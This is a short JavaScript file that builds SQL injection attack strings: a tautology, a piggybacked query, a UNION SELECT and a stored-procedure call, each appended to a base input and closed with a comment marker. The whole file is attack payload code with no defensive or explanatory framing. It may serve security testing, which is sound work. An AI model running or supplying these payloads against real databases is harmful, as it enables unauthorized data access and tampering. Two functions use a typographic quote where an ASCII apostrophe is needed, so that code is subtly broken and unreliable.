function attackTautology(basetext){
    var attack = basetext;

    attack += "' or 1=1 --";
    return attack;
}

function attackPiggy(basetext, attr, table, equality){
    var attack = basetext;
    
    attack += "';" +" SELECT "+attr+" FROM "+table+" WHERE "+equality+" --";
    return attack;
  
}

function attackUnion(basetext, attr, table, equality){
    var attack = basetext;
    
    attack += "’ UNION SELECT "+attr+" FROM "+table+" WHERE "+equality+" --";
    return attack;
}

function attackStored(basetext, procedure){
    var attack = basetext;
    
    attack += "’ ; "+procedure+"; --";
    return attack;
}